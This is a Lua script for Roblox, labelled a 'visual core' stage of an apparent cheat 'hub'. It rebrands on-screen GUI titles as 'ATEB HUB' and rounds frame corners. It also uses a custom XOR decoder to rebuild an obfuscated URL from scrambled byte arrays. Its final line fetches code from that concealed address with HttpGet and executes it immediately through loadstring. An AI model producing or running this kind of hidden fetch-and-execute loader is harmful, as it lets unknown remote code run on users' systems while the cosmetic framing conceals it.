
--[[ STAGE 2: VISUAL CORE ]]
local X6mMnPqvQ4BSLZ6J = bit32 and bit32.bxor
if not X6mMnPqvQ4BSLZ6J then
    X6mMnPqvQ4BSLZ6J = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function QvNHQIplDgGCCmfPuoB(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = X6mMnPqvQ4BSLZ6J(v, a)
        else
            v = X6mMnPqvQ4BSLZ6J(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local VyPjWlqu841qpuJ = {
  {{151, 168, 155}, 52, 47, 1, 6, false, 18},
  {{100, 38, 40, 51}, 106, 28, 0, 3, true, 14},
  {{31, 37, 60, 1}, 211, 125, 0, 1, true, 22},
  {{56, 14, 118, 119, 124, 118, 108}, 57, 208, 1, 4, true, 19},
  {{47, 120, 11, 53, 67}, 218, 127, 0, 1, false, 17},
  {{37, 45, 67, 70, 93, 88, 87}, 83, 23, 0, 2, false, 20},
  {{65, 112, 107, 106, 98, 94}, 27, 237, 1, 5, false, 1},
  {{227, 163, 159, 165}, 125, 109, 1, 2, true, 7},
  {{14, 46, 60, 60, 68, 72}, 217, 116, 0, 7, false, 16},
  {{39, 46, 111, 40, 27, 26, 17}, 112, 228, 1, 4, true, 10},
  {{71, 3, 61, 78, 86}, 39, 244, 0, 3, false, 3},
  {{118, 132}, 153, 136, 0, 2, false, 25},
  {{174, 162, 174, 138, 141, 119, 189}, 137, 194, 1, 2, false, 23},
  {{209, 234, 230, 248, 252, 239}, 141, 249, 1, 1, false, 11},
  {{19, 94, 27, 5}, 244, 121, 1, 1, true, 13},
  {{234, 240, 51, 70}, 189, 82, 0, 6, false, 2},
  {{134, 125, 173}, 231, 239, 0, 2, false, 21},
  {{240, 249, 242}, 202, 72, 0, 1, true, 9},
  {{146, 150, 157, 87, 152, 93}, 232, 175, 0, 7, false, 24},
  {{0, 241, 2, 249}, 176, 36, 0, 4, false, 4},
  {{67, 66, 81}, 204, 25, 1, 6, true, 12},
  {{53, 54, 57, 72}, 111, 50, 0, 2, false, 8},
  {{194, 59, 207, 199, 218}, 192, 142, 1, 5, true, 5},
  {{1, 7, 59}, 17, 188, 1, 5, false, 15},
  {{11, 51, 12, 49, 57, 253}, 149, 46, 1, 2, false, 6}
}
local aHbEDEs_pQsPyf6Bs51c8hQ = {}
for JaGZUjW8LeUBmsRBfI_Q34nKoH = 1, #VyPjWlqu841qpuJ do
    local LEtbbLhBzx4t2msyFdUg_psr = VyPjWlqu841qpuJ[JaGZUjW8LeUBmsRBfI_Q34nKoH]
    aHbEDEs_pQsPyf6Bs51c8hQ[LEtbbLhBzx4t2msyFdUg_psr[7]] = QvNHQIplDgGCCmfPuoB(LEtbbLhBzx4t2msyFdUg_psr[1], LEtbbLhBzx4t2msyFdUg_psr[2], LEtbbLhBzx4t2msyFdUg_psr[3], LEtbbLhBzx4t2msyFdUg_psr[4], LEtbbLhBzx4t2msyFdUg_psr[5], LEtbbLhBzx4t2msyFdUg_psr[6])
end
local MpT85hjrlMwc0du = table.concat(aHbEDEs_pQsPyf6Bs51c8hQ)
local HubName = "ATEB HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(MpT85hjrlMwc0du))()
